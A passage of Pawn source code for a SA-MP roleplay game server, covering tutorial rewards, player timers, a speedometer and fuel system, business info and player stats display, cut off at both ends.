					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SendClientMessage(i, COLOR_SERVER, "");
					SetPlayerVirtualWorld(i, 0);
			        TutTime[i] = 0; PlayerInfo[i][pTut] = 1;
					gOoc[i] = 0; gNews[i] = 0; gFam[i] = 0;
					TogglePlayerControllable(i, 1);
					SetCameraBehindPlayer(i);
					TogglePlayerSpectating(i, 0);
					SetPlayerSpawn(i);
					addVV(PlayerInfo[i][pBAccLY], PlayerInfo[i][pBAcc],10000);
					ResetPlayerCash(i);
					GivePlayerCash(i,15000000);
					PlayerInfo[i][pLevel] = 3;
					PlayerInfo[i][pPremiumPoints] = 20;
					PlayerInfo[i][pCarLic] = 1;
					PlayerInfo[i][pCarLicT] = 100;
					PlayerInfo[i][pFlyLic] = 1;
					PlayerInfo[i][pFlyLicT] = 100;
					PlayerInfo[i][pBoatLic] = 1;
					PlayerInfo[i][pBoatLicT] = 100;
					SetPlayerInterior(i,0);
					SetPlayerVirtualWorld(i,0);
					TogglePlayerControllable(i,true);
					new str1[1000];
					mysql_format(SQL,str1,1000,"UPDATE users SET `Tutorial`='1',`Bank2`='10000',`Money`='60000000',`Level`='3',`PremiumPoints`='20',`InregistratAzi`='1' WHERE `name`='%s'",PlayerInfo[i][pNormalName]);
					mysql_tquery(SQL,str1,"","");
					mysql_format(SQL,str1,1000,"UPDATE users SET `CarLic`='1',`CarLicT`='100',`FlyLic`='1',`FlyLicT`='100',`BoatLic`='1',`BoatLicT`='100' WHERE `id`='%d'",PlayerInfo[i][pSQLID]);
					mysql_tquery(SQL,str1,"","");
					/*format(MGLOBAL, sizeof(MGLOBAL), "{A9C4E4}** {FFFFFF}Salutare, in primul rand vreau sa iti multumesc ca ai ales serverul nostru, drept prima ta rasplata pentru inregistrare ai primit $100,000,000 + LEVEL 10 + 500 de Puncte Premium {A9C4E4}**");
					format(MGLOBAL, sizeof(MGLOBAL), "%s\n{A9C4E4}** {FFFFFF}In timp ce avansezi in nivel vei primi urmatoarele bonusurii:{A9C4E4} **\n",MGLOBAL);
					format(MGLOBAL, sizeof(MGLOBAL), "%s{FFFFFF}Nivel 4 (primul [/buylevel]) - $10,000,000\nNivel 5 (al doilea [/buylevel]) - $20,000,000\nNivel 6 (al treilea [/buylevel]) - $30,0000,000\n{FF0000}** {FFFFFF}Nivel 7 (al patrulea [/buylevel]) - $40,000,000 + 20 RP + LEVEL UP{FF0000}**\n{A9C4E4}Iti uram un joc placut!", MGLOBAL);
					ShowPlayerDialog(i, DIALOG_BONUSURI, DIALOG_STYLE_MSGBOX, "Despre avere (bonusuri).", MGLOBAL, "Am inteles", "");
					citeste10sec[i] = 5;*/
					ShowPlayerDialog(i, DIALOG_REFERRAL, DIALOG_STYLE_INPUT, "SERVER: Referral", "You brought someone in this community?\nIf so, enter the name of the player you brought and click 'Continue'.\nIf you were not brought one server, press 'CANCEL'.", "Continue", "CANCEL");
			    }
			}
			if(PlayerTazeTime[i] >= 1)
			{
			    PlayerTazeTime[i] += 1;
			    if(PlayerTazeTime[i] == 15)
			    {
                    PlayerTazeTime[i] = 0;
			    }
			    else
			    {
			        new Float:angle;
					GetPlayerFacingAngle(i, angle);
					SetPlayerFacingAngle(i, angle + 90);
			    }
			}
			if(PlayerDrunk[i] >= 5)
			{
			    PlayerDrunkTime[i] += 1;
			    if(PlayerDrunkTime[i] == 8)
			    {
			        PlayerDrunkTime[i] = 0;
			        new Float:angle;
					GetPlayerFacingAngle(i, angle);
					if(IsPlayerInAnyVehicle(i))
					{
					    if(GetPlayerState(i) == 2)
					    {
					    	SetVehicleZAngle(GetPlayerVehicleID(i), angle + 15);
					    	SetPlayerDrunkLevel (i, 5000);
						}
					}
					else
					{
					    LoopingAnim(i,"PED","WALK_DRUNK",4.0,1,1,1,1,0);
					    SetPlayerDrunkLevel (i, 5000);
					}
			    }
			}
			if(GarbageEndTime[i] >= 1)//garbagejob
			{
			    GarbageEndTime[i] += 1;
			    if(GarbageEndTime[i] == 5)
			    {
				  	SendClientMessage(i, COLOR_SERVER, "{3385FF}Garbage Collected");
				  	SendClientMessage(i, COLOR_LIGHTBLUE, "Return to the depot for your Pay Check.");
				  	GarbageEndTime[i] = 0;
					TogglePlayerControllable(i, 1);
			    }
			}
			if(GarbageTime[i] >= 1)//garbagejob
			{
			    GarbageTime[i] += 1;
			    if(GarbageTime[i] == 5)
			    {
				  	SendClientMessage(i, COLOR_SERVER, "{3385FF}Garbage Collected");
				  	GarbageTime[i] = 0;
					TogglePlayerControllable(i, 1);
			    }
			}
			if(BinTime[i] >= 1)//garbagejob
			{
			    BinTime[i] += 1;
			    if(BinTime[i] == 5)
			    {
				  	SendClientMessage(i, COLOR_SERVER, "{3385FF}The bin has been emptied");
				  	BinTime[i] = 0;
					TogglePlayerControllable(i, 1);
			    }
			}
			if(PlayerInfo[i][pGarbageTime] > 0)
			{
			    if(PlayerInfo[i][pGarbageTime] == 1)
			    {
			        if(PlayerInfo[i][pJob] == 10)
			        {
				        SendClientMessage(i, COLOR_SERVER, "{999999}You can do another Garbage run now.");
				        PlayerInfo[i][pGarbageTime] -= 1;
					}
			        else
			        {
				        PlayerInfo[i][pGarbageTime] -= 1;
					}
			    }
			    else if(PlayerInfo[i][pGarbageTime] <= 0)
			    {
			        PlayerInfo[i][pGarbageTime] = 0;
			    }
			    else
			    {
			        PlayerInfo[i][pGarbageTime] -= 1;
			    }
			}
			if(PlayerStoned[i] >= 2)
			{
			    new Float:angle;
				GetPlayerFacingAngle(i, angle);
				if(IsPlayerInAnyVehicle(i))
				{
					if(GetPlayerState(i) == 2)
					{
					    SetVehicleZAngle(GetPlayerVehicleID(i), angle + 15);
					    SetPlayerDrunkLevel (i, 5000);
					}
				}
				else
				{
					SetPlayerDrunkLevel (i, 5000);
				}
			}
			if(TaxiCallTime[i] > 0)
			{
			    if(TaxiAccepted[i] < 999)
			    {
				    if(IsPlayerConnected(TaxiAccepted[i]))
				    {
				        new Float:X,Float:Y,Float:Z;
						GetPlayerPos(TaxiAccepted[i], X, Y, Z);
						SetPlayerCheckpoint(i, X, Y, Z, 5);
				    }
				}
			}
			if(MedicCallTime[i] > 0)
			{
			    if(MedicCallTime[i] == 300)
				{
					MedicCallTime[i] = 0;
					DisablePlayerCheckpoint(i);
					GameTextForPlayer(i, "~r~~h~RedMarker gone", 2500, 1);
				}
			    else
				{
				    format(string, sizeof(string), "%d", 300 - MedicCallTime[i]);
					GameTextForPlayer(i, string, 1500, 6);
					MedicCallTime[i] += 1;
				}
			}
			if(MechanicCallTime[i] > 0)
			{
			    if(MechanicCallTime[i] == 300)
				{
					MechanicCallTime[i] = 0;
					DisablePlayerCheckpoint(i);
					GameTextForPlayer(i, "~r~~h~RedMarker gone", 2500, 1);
				}
			    else
				{
				    format(string, sizeof(string), "%d", 300 - MechanicCallTime[i]);
					GameTextForPlayer(i, string, 1500, 6);
					MechanicCallTime[i] += 1;
				}
			}
			if(PlayerCuffed[i] == 1)
			{
			    if(PlayerCuffedTime[i] <= 0)
			    {
			        TogglePlayerControllable(i, 1);
			        PlayerCuffed[i] = 0;
			        PlayerCuffedTime[i] = 0;
			        PlayerTazeTime[i] = 1;
			    }
			    else
			    {
			        PlayerCuffedTime[i] -= 1;
			    }
			}
			if(PlayerCuffed[i] == 2)
			{
			    if(PlayerCuffedTime[i] <= 0)
			    {
			        GameTextForPlayer(i, "~r~~h~You broke the Cuffs, you are free!", 2500, 3);
			        TogglePlayerControllable(i, 1);
			        PlayerCuffed[i] = 0;
			        PlayerCuffedTime[i] = 0;
			    }
			    else
			    {
			        PlayerCuffedTime[i] -= 1;
			    }
			}
    		if(Undercover[i] == 1)
			{
			    PlayerTextDrawShow(i, UndercoverText[i]);
			}
			else
			{
			    PlayerTextDrawHide(i, UndercoverText[i]);
			}
		}
	}
	return 1;
}
public EstiFondator(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		new nume[512];
        GetPlayerName(playerid, nume, sizeof(nume));
        if((strcmp(nume, "DeaThWiN.", true) == 0) || (strcmp(nume, "2pac", true) == 0))
        {
		    return 1;
		}
	}
	return 0;
}
public RwRobi(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		new nume[512];
        GetPlayerName(playerid, nume, sizeof(nume));
        if((strcmp(nume, "DeaThWiN", true) == 0) || strcmp(nume, "2pac", true) == 0)
        {
		    return 1;
		}
	}
	return 0;
}
forward Checkvehinfo();
public Checkvehinfo()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
    	if(IsPlayerConnected(i))
       	{
       	    if(GetPlayerState(i) == PLAYER_STATE_DRIVER && InTunning[i] == 0)
       	    {
	       		new vehicle = GetPlayerVehicleID(i),
                	spe = Carspeed(i);
                new str1[128],str2[128],str3[128],str4[128],str5[128],str6[128];
				if(spe < 1)
				{
					format(str6, sizeof(str6), "~W~D~W~_~r~N_~w~R");
				}
				if(spe > 0)
				{
					format(str6, sizeof(str6), "~R~D~W~_~W~N_~w~R");
				}
				if(IsVehicleDrivingBackwards(GetPlayerVehicleID(i)))
				{
					format(str6, sizeof(str6), "~W~D~W~_N_~R~R");
				}
				PlayerTextDrawSetString(i, TDKM[i][0], str6);
				PlayerTextDrawShow(i, TDKM[i][0]);
				format(str1,sizeof(str1)," Speed:_%d_KM/H",spe);
				PlayerTextDrawSetString(i, TDKM[i][1], str1);
				PlayerTextDrawShow(i, TDKM[i][1]);
				if(!IsABike(vehicle))
				{	
					format(str2,sizeof(str2),"Fuel:_%d_L", Gas[vehicle]);
					PlayerTextDrawSetString(i, TDKM[i][2], str2);
					PlayerTextDrawShow(i, TDKM[i][2]);
				}
				if(OwnedVeh(vehicle) != 0 && !IsAPlane(vehicle))
				{
					format(str3,sizeof(str3),"Odometer:_%.0f_KM",CarInfo[OwnedVeh(vehicle)][cKM]);
					PlayerTextDrawSetString(i, TDKM[i][3], str3);
					PlayerTextDrawShow(i, TDKM[i][3]);
				}
				if(OwnedVeh(vehicle) != 0 && CarInfo[OwnedVeh(vehicle)][cLock] == 0)
				{
				    format(str4,sizeof(str4),"STATUS: ~G~Unlocked");
					PlayerTextDrawSetString(i, TDKM[i][4], str4);
					PlayerTextDrawShow(i, TDKM[i][4]);
				}
				else if(OwnedVeh(vehicle) != 0 && CarInfo[OwnedVeh(vehicle)][cLock] == 1)
				{
				    format(str5,sizeof(str5),"STATUS: ~R~Locked");
					PlayerTextDrawSetString(i, TDKM[i][4], str5);
					PlayerTextDrawShow(i, TDKM[i][4]);
				}
			}
    	}
	}
	return 1;
}

public CheckGas()
{
	new engine,lights,alarm,doors,bonnet,boot,objective;
	foreach(Player,i)
	{
   	    if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
   	    {
       		new vehicle = GetPlayerVehicleID(i);
			if(Gas[vehicle] >= 1)
			{
	   		    if(vehEngine[vehicle] == 1)
	   		    {
					if(IsAPlane(vehicle) || IsABoat(vehicle) || IsABike(vehicle) || IsAGarbageTruck(vehicle) || IsABus(vehicle)
					|| IsATruck(vehicle)) { Gas[vehicle]++; }
	              	Gas[vehicle]--;
	                if(IsAnOwnableCar(vehicle))
	                {
			            if(CarInfo[OwnedVeh(vehicle)][cOwned] == 1)
						{
	                        new spe = Carspeed(i),Float:carhealth;
							if(spe > 5 && GetPlayerState(i) == PLAYER_STATE_DRIVER && GetPlayerVehicleID(i) == vehicle)
							{
							    if(!IsABoat(vehicle) && !IsAPlane(vehicle))
							    {
								    CarInfo[OwnedVeh(vehicle)][cKM] += 0.4;
								    vUpdate(OwnedVeh(vehicle), cKMx);
								}
							}
							if(GetPlayerState(i) == PLAYER_STATE_DRIVER && GetPlayerVehicleID(i) == vehicle)
							{
								GetVehicleHealth(vehicle, carhealth);
								GetVehicleDamageStatus(vehicle, CarInfo[OwnedVeh(vehicle)][cDamage1], CarInfo[OwnedVeh(vehicle)][cDamage2], CarInfo[OwnedVeh(vehicle)][cDamage3], CarInfo[OwnedVeh(vehicle)][cDamage4]);
								CarInfo[OwnedVeh(vehicle)][cHP] = carhealth;
								CarInfo[OwnedVeh(vehicle)][cGas] = Gas[vehicle];
								vUpdate(OwnedVeh(vehicle), cHPx);
								vUpdate(OwnedVeh(vehicle), cDamage1x);
								vUpdate(OwnedVeh(vehicle), cDamage2x);
								vUpdate(OwnedVeh(vehicle), cDamage3x);
								vUpdate(OwnedVeh(vehicle), cDamage4x);
								vUpdate(OwnedVeh(vehicle), cGasx);
							}
						}
					}
				}
	   		}
   			else
           	{
              	NoFuel[i] = 1;
              	TogglePlayerControllable(i, 0);
	        	GameTextForPlayer(i,"~w~~n~~n~~n~~n~~n~~n~~n~~n~No fuel in vehicle.",1500,3);
	        	vehEngine[vehicle] = 0;
    			GetVehicleParamsEx(vehicle,engine,lights,alarm,doors,bonnet,boot,objective);
      	    	SetVehicleParamsEx(vehicle,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
      	    	SetPVarInt(i, "Engine", 0);
			}
		}
	}
	return 1;
}

public OnEnterExitModShop(playerid, enterexit, interiorid)
{
    if(enterexit == 0)
    {
		if(IsPlayerInRangeOfPoint(playerid,10.0,617.5360,-1.9900,1000.6647))
		{
			if(GetPlayerCash(playerid) >= BizzInfo[38][bEntranceCost])
			{
				EnterInModShop[playerid] = 1;
				return 1;
			}
		}
		if(IsPlayerInRangeOfPoint(playerid,10.0,616.7844,-74.8150,997.7675))
		{
			if(GetPlayerCash(playerid) >= BizzInfo[39][bEntranceCost])
			{
				EnterInModShop[playerid] = 1;
				return 1;
			}
		}
    }
    return 1;
}
public PrintBizInfo(playerid,targetid)
{
    if(IsPlayerConnected(playerid))
	{
		new coordsstring[256];
		format(coordsstring, sizeof(coordsstring),"*** %s ***",BizzInfo[targetid][bMessage]);
		SendClientMessage(playerid, COLOR_SERVER,coordsstring);
		format(coordsstring, sizeof(coordsstring), "Locked: %d Entry Fee: $%s Till: $%s.", BizzInfo[targetid][bLocked], FormatNumber(BizzInfo[targetid][bEntranceCost]), FormatNumber(BizzInfo[targetid][bTill]));
		SendClientMessage(playerid, COLOR_SERVER,coordsstring);
		SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
	}
}

public ShowStats(playerid,targetid)
{
    if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
	{
		new casatorit[256];
		if(PlayerInfo[targetid][pCasatorit] == 0) casatorit = "Nu";
		if(PlayerInfo[targetid][pCasatorit] > 0)
		{
			new sqlselect[1000],rezultat[512];
			mysql_format(SQL, sqlselect, sizeof(sqlselect), "SELECT * FROM `users` WHERE `id`='%d'", PlayerInfo[targetid][pCasatorit]);
			new Cache: extragerenume = mysql_query(SQL, sqlselect);
			for(new i, j = cache_get_row_count(); i != j; i++)
			{
				cache_get_field_content(i, "name", rezultat); format(casatorit, sizeof(casatorit), "Da(cu %s)",rezultat);
			}
			cache_delete(extragerenume);
		}
		new cash =  GetPlayerCash(targetid);
		new atext[20];
		if(PlayerInfo[targetid][pSex] == 1) { atext = "Masculin"; }
		else if(PlayerInfo[targetid][pSex] == 2) { atext = "Feminin"; }
  		new otext[20];
		if(PlayerInfo[targetid][pOrigin] == 1) { otext = "Los Santos"; }
		else if(PlayerInfo[targetid][pOrigin] == 2) { otext = "San Fiero"; }
		new ttext[20];
				if(PlayerInfo[targetid][pMember] == 0 && PlayerInfo[targetid][pLeader] == 0) { ttext = "Civilian"; }
		else if(PlayerInfo[targetid][pMember] == 1 || PlayerInfo[targetid][pLeader] == 1) { ttext = "EdarePolice"; }
		else if(PlayerInfo[targetid][pMember] == 2 || PlayerInfo[targetid][pLeader] == 2) { ttext = "PoliceFederal"; }
		else if(PlayerInfo[targetid][pMember] == 3 || PlayerInfo[targetid][pLeader] == 3) { ttext = "GardMeli"; }
		else if(PlayerInfo[targetid][pMember] == 4 || PlayerInfo[targetid][pLeader] == 4) { ttext = "Los Aztecas"; }
		else if(PlayerInfo[targetid][pMember] == 5 || PlayerInfo[targetid][pLeader] == 5) { ttext = "Yakuza Family"; }
		else if(PlayerInfo[targetid][pMember] == 6 || PlayerInfo[targetid][pLeader] == 6) { ttext = "Los Vagos"; }
		else if(PlayerInfo[targetid][pMember] == 8 || PlayerInfo[targetid][pLeader] == 8) { ttext = "LVPD"; }
		else if(PlayerInfo[targetid][pMember] == 9 || PlayerInfo[targetid][pLeader] == 9) { ttext = "KhabarNegar"; }
		else if(PlayerInfo[targetid][pMember] == 10 || PlayerInfo[targetid][pLeader] == 10) { ttext = "Ballas"; }
		else if(PlayerInfo[targetid][pMember] == 11 || PlayerInfo[targetid][pLeader] == 11) { ttext = "Hitman Agency"; }
		else if(PlayerInfo[targetid][pMember] == 12 || PlayerInfo[targetid][pLeader] == 12) { ttext = "EdareAmuzesh"; }
		else if(PlayerInfo[targetid][pMember] == 13 || PlayerInfo[targetid][pLeader] == 13) { ttext = "Ajans"; }
		else if(PlayerInfo[targetid][pMember] == 14 || PlayerInfo[targetid][pLeader] == 14) { ttext = "Pezeshk"; }
		else if(PlayerInfo[targetid][pMember] == 15 || PlayerInfo[targetid][pLeader] == 15) { ttext = "SFPD"; }
	    new rtext[64];
		if(PlayerInfo[targetid][pRank] == 1) format(rtext,sizeof(rtext),"%s",DynamicFactions[PlayerInfo[targetid][pMember]][fRankName1]);
		else if(PlayerInfo[targetid][pRank] == 2) format(rtext,sizeof(rtext),"%s",DynamicFactions[PlayerInfo[targetid][pMember]][fRankName2]);
		else if(PlayerInfo[targetid][pRank] == 3) format(rtext,sizeof(rtext),"%s",DynamicFactions[PlayerInfo[targetid][pMember]][fRankName3]);
		else if(PlayerInfo[targetid][pRank] == 4) format(rtext,sizeof(rtext),"%s",DynamicFactions[PlayerInfo[targetid][pMember]][fRankName4]);
		else if(PlayerInfo[targetid][pRank] == 5) format(rtext,sizeof(rtext),"%s",DynamicFactions[PlayerInfo[targetid][pMember]][fRankName5]);
		else if(PlayerInfo[targetid][pRank] == 6) format(rtext,sizeof(rtext),"%s",DynamicFactions[PlayerInfo[targetid][pMember]][fRankName6]);
		else if(PlayerInfo[targetid][pRank] == 7) format(rtext,sizeof(rtext),"%s",DynamicFactions[PlayerInfo[targetid][pMember]][fRankName7]);
		else { rtext = "None"; }
        new jtext[128];
        if(PlayerInfo[targetid][pJob] == 1) { jtext = "Detective"; }
        else if(PlayerInfo[targetid][pJob] == 2) { jtext = "Car Jacker"; }
        else if(PlayerInfo[targetid][pJob] == 4) { jtext = "Drugs Dealer"; }
        else if(PlayerInfo[targetid][pJob] == 5) { jtext = "Pizza Boy"; }
        else if(PlayerInfo[targetid][pJob] == 7) { jtext = "Bus Driver"; }
        else if(PlayerInfo[targetid][pJob] == 8) { jtext = "Mechanic"; }
        else if(PlayerInfo[targetid][pJob] == 9) { jtext = "Arms Dealer"; }
        else if(PlayerInfo[targetid][pJob] == 10) { jtext = "Garbage Man"; }
        else if(PlayerInfo[targetid][pJob] == 13) { jtext = "Fisherman"; }
        else if(PlayerInfo[targetid][pJob] == 14) { jtext = "Trucker"; }
        else if(PlayerInfo[targetid][pJob] == 15) { jtext = "Pocket Theif"; }
        else if(PlayerInfo[targetid][pJob] == 16) { jtext = "Curier"; }
        else if(PlayerInfo[targetid][pJob] == 17) { jtext = "Transportator de Ciment"; }
        else if(PlayerInfo[targetid][pJob] == 18) { jtext = "Muncitor in Cariera"; }
	    else { jtext = "None"; }
		new drank[20];
		if(PlayerInfo[targetid][pPremiumAccount] == 0) { drank = "No"; }
		else if(PlayerInfo[targetid][pPremiumAccount] == 1) { drank = "Yes"; }
		else { drank = "None"; }
	 	new clanuuu[32];
		new clanrankk[32];
	 	if(PlayerInfo[targetid][pClan] < 1)
		{
			clanuuu = "None";
			clanrankk = "None";
		}
		else
		{
			format(clanuuu, sizeof(clanuuu), "%s", ClanInfo[PlayerInfo[targetid][pClan]][cClanName]);
			switch(PlayerInfo[targetid][pCRank])
			{
				case 1: format(clanrankk, sizeof(clanrankk), "%s", ClanInfo[PlayerInfo[targetid][pClan]][cClanRankName1]);
				case 2: format(clanrankk, sizeof(clanrankk), "%s", ClanInfo[PlayerInfo[targetid][pClan]][cClanRankName2]);
				case 3: format(clanrankk, sizeof(clanrankk), "%s", ClanInfo[PlayerInfo[targetid][pClan]][cClanRankName3]);
				case 4: format(clanrankk, sizeof(clanrankk), "%s", ClanInfo[PlayerInfo[targetid][pClan]][cClanRankName4]);
				case 5: format(clanrankk, sizeof(clanrankk), "%s", ClanInfo[PlayerInfo[targetid][pClan]][cClanRankName5]);
				case 6: format(clanrankk, sizeof(clanrankk), "%s", ClanInfo[PlayerInfo[targetid][pClan]][cClanRankName6]);
				case 7: format(clanrankk, sizeof(clanrankk), "%s", ClanInfo[PlayerInfo[targetid][pClan]][cClanRankName7]);
			}
		}
		new mutedt[50];
  		if(PlayerInfo[targetid][pMuteTime] == 0)
		{
			mutedt = "No";
		}
  		else if(PlayerInfo[targetid][pMuteTime] >= 1)
		{
			new mutetim = PlayerInfo[targetid][pMuteTime],
				mutetim2[10];
			format(mutetim2,sizeof(mutetim2),"%d",mutetim);
			mutedt = mutetim2;
	 	}
		new adminl = PlayerInfo[targetid][pAdmin];
		new helperl = PlayerInfo[targetid][pHelper];
		//new age = PlayerInfo[targetid][pAge];
		new ptime = PlayerInfo[targetid][pConnectTime];
		//new deaths = PlayerInfo[targetid][pDeaths];
		//new fishes = PlayerInfo[targetid][pFishes];
		new crimes = PlayerInfo[targetid][pCrimes];
		new arrests = PlayerInfo[targetid][pArrested];
		//new warrests = PlayerInfo[targetid][pWantedDeaths];
		new drugs = PlayerInfo[targetid][pDrugs];
		new warnings = PlayerInfo[targetid][pWarns];
		new mats = PlayerInfo[targetid][pMats];
		//new wanted = PlayerInfo[targetid][pWantedLevel];
		new plevel = PlayerInfo[targetid][pLevel];
		new exp = PlayerInfo[targetid][pExp];
		//new kills = PlayerInfo[targetid][pKills];
		new pnumber = PlayerInfo[targetid][pPnumber];
		
		new mymoney[LY_STRING_LEN];  
		GetLYString(PlayerInfo[targetid][pBAccLY], PlayerInfo[targetid][pBAcc], mymoney);
		
		new nxtlevel = PlayerInfo[targetid][pLevel];
		new expamount;
		if(PlayerInfo[targetid][pLevel] == 1 || PlayerInfo[targetid][pLevel] == 2 || PlayerInfo[targetid][pLevel] == 3 || PlayerInfo[targetid][pLevel] == 4)
		{
		    expamount = nxtlevel*2;
		}
		else if(PlayerInfo[targetid][pLevel] >= 5)
		{
		    expamount = nxtlevel*levelexp;
		}
		new pretlevel = nxtlevel*levelcost;
		new housekey = PlayerInfo[targetid][pPhousekey];
		new housekey2 = PlayerInfo[targetid][pPhousekey2];
		new bizkey = PlayerInfo[targetid][pPbiskey];
		new intir = PlayerInfo[targetid][pInt];
		new local = PlayerInfo[targetid][pLocal];
		new bltime = PlayerInfo[targetid][pFpunish];
		//new fwarn = PlayerInfo[targetid][pFACWarns];
		new premiumpoints = PlayerInfo[targetid][pPremiumPoints];
		new fireworks = PlayerInfo[targetid][pFWorks];
		new puncte = PlayerInfo[targetid][pRob];
		new vw = GetPlayerVirtualWorld(targetid);
		new hiddenss = PlayerInfo[targetid][pHiddenColor];
		new Float:health;
		new name[MAX_PLAYER_NAME];
		new ipplayer[16];
		new Float:armour;
		new masinistats = 0;
		if(PlayerInfo[targetid][pPcarkey] != 0)
		{
		    masinistats++;
		}
		if(PlayerInfo[targetid][pmotokey] != 0)
		{
		    masinistats++;
		}
		if(PlayerInfo[targetid][pprcarkey] != 0)
		{
		    masinistats++;
		}
		if(PlayerInfo[targetid][pprcarkey2] != 0)
		{
		    masinistats++;
		}
		if(PlayerInfo[targetid][pPPluscarkey] != 0)
		{
		    masinistats++;
		}
		if(PlayerInfo[targetid][pPPluscarkey2] != 0)
		{
		    masinistats++;
		}
		if(PlayerInfo[targetid][pCarkey7] != 0)
		{
		    masinistats++;
		}
		if(PlayerInfo[targetid][pCarkey8] != 0)
		{
		    masinistats++;
		}
		if(PlayerInfo[targetid][pCarkey9] != 0)
		{
		    masinistats++;
		}
		if(PlayerInfo[targetid][pCarkey10] != 0)
		{
		    masinistats++;
		}
		if(PlayerInfo[targetid][pCarkey11] != 0)
		{
		    masinistats++;
		}
		if(PlayerInfo[targetid][pCarkey12] != 0)
		{
		    masinistats++;
		}
		if(PlayerInfo[targetid][pCarkey13] != 0)
		{
		    masinistats++;
		}
		if(PlayerInfo[targetid][pCarkey14] != 0)
		{
		    masinistats++;
		}
		if(PlayerInfo[targetid][pCarkey15] != 0)
		{
		    masinistats++;
		}
		GetPlayerName(targetid, name, sizeof(name));
		GetPlayerHealth(targetid,health);
		GetPlayerArmour(targetid,armour);
        GetPlayerIp(targetid, ipplayer, sizeof(ipplayer));
		new Float:px,Float:py,Float:pz;
		GetPlayerPos(targetid, px, py, pz);
		new viptext[256];
		if(PlayerInfo[targetid][pVip] == 0) viptext = "{0066FF}Standard{FFFFFF}";
		else if(PlayerInfo[targetid][pVip] == 1) viptext = "{F97804}VIP{FFFFFF}";
		new coordsstring[256];
		format(coordsstring, sizeof(coordsstring), "(%d) %s | Playing hours: %d | Phone no: %d | Job: %s | Warns: %d/3",targetid,name,ptime,pnumber,jtext,warnings);
		SendClientMessage(playerid, COLOR_SERVER,coordsstring);
		format(coordsstring, sizeof(coordsstring), "Level: %d | Respect Points: %d/%d | Next level price: %s | Money: %s | Bank money: %s",plevel,exp,expamount,FormatNumber(pretlevel),FormatNumber(cash),FormatBigNumber(mymoney));
		SendClientMessage(playerid, COLOR_SERVER,coordsstring);
		format(coordsstring, sizeof(coordsstring), "Group: %s | Faction punish: %d/20 | Premium: %s(%d points) | Vehicles: %d",ttext,bltime,drank,premiumpoints, masinistats);
		SendClientMessage(playerid, COLOR_SERVER,coordsstring);
		if(PlayerInfo[targetid][pClan] >= 1)
		{
			format(coordsstring, sizeof(coordsstring), "Clan: %s(%s) | Rank: %d (%s)",clanuuu,ClanInfo[PlayerInfo[targetid][pClan]][cClanTag],PlayerInfo[targetid][pCRank],clanrankk);
			SendClientMessage(playerid, COLOR_SERVER,coordsstring);
		}
		format(coordsstring, sizeof(coordsstring), "Rob Points: %d/20 | Arrests: %d | Crimes: %d | Credit: %d$ | Status Cont: %s",puncte,arrests,crimes,PlayerInfo[targetid][pCredits], viptext);
		SendClientMessage(playerid, COLOR_SERVER,coordsstring);
		format(coordsstring, sizeof(coordsstring), "Married(with): %s | Materials: %s | Drugs: %d | Fireworks: %d | Hiddens: %d",casatorit,FormatNumber(mats),drugs,fireworks,hiddenss);
		SendClientMessage(playerid, COLOR_SERVER,coordsstring);
		format(coordsstring, sizeof(coordsstring), "House: %d | VIP House: %d | Business: %d | Hirekey: %d | Interior: %d | Local: %d | SQLID: %d", housekey,housekey2,bizkey,HireCar[targetid],intir,local,PlayerInfo[targetid][pSQLID]);
		SendClientMessage(playerid, COLOR_SERVER,coordsstring);
		
		if (PlayerInfo[playerid][pHelper] >= 1)
		{
		format(coordsstring, sizeof(coordsstring), "Health: %.1f | Armour: %.1f | VirtualWorld: %d | HelperLevel: %d | HelpedPlayers: %d | Tokens: %d", health,armour,vw,helperl,PlayerInfo[targetid][pHelpedPlayers],PlayerInfo[targetid][pHToken]);
		SendClientMessage(playerid, COLOR_SERVER,coordsstring);
		}
		if (PlayerInfo[playerid][pAdmin] >= 1)
		{
		format(coordsstring, sizeof(coordsstring), "Health: %.1f | Armour: %.1f | VirtualWorld: %d | HelperLevel: %d | AdminLevel: %d | HelpedPlayers: %d", health,armour,vw,helperl,adminl,PlayerInfo[targetid][pHelpedPlayers]);
		SendClientMessage(playerid, COLOR_SERVER,coordsstring);
	  	}
	}
}


public SetPlayerToTeamColor(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	  	SetPlayerColor(playerid,COLOR_WHITE); // Civilian
		if(PlayerInfo[playerid][pColors] == 2) { SetPlayerColor(playerid, 0xFFC363FF); }
		if(PlayerInfo[playerid][pColors] == 3) { SetPlayerColor(playerid, 0xCF4DFFFF); }
		if(PlayerInfo[playerid][pColors] == 4) { SetPlayerColor(playerid, 0x4DA0FFFF); }
		if(PlayerInfo[playerid][pColors] == 5) { SetPlayerColor(playerid, 0x4DEDFFFF); }
		if(PlayerInfo[playerid][pColors] == 6) { SetPlayerColor(playerid, 0xB1FF14FF); }
		if(PlayerInfo[playerid][pColors] == 7) { SetPlayerColor(playerid, 0xFF54E5FF); }
      	if(PlayerInfo[playerid][pMember] == 1) { SetPlayerColor(playerid, 0x0000FFFF); } // LSPD
      	if(PlayerInfo[playerid][pLeader] == 1) { SetPlayerColor(playerid, 0x0000FFFF); } // LSPD
      	if(PlayerInfo[playerid][pMember] == 2) { SetPlayerColor(playerid, 0x0000FFFF); } // FBI
      	if(PlayerInfo[playerid][pLeader] == 2) { SetPlayerColor(playerid, 0x0000FFFF); } // FBI
      	if(PlayerInfo[playerid][pLeader] == 3) { SetPlayerColor(playerid, 0x00006AFF); } // National Guard
      	if(PlayerInfo[playerid][pMember] == 3) { SetPlayerColor(playerid, 0x00006AFF); } // National Guard
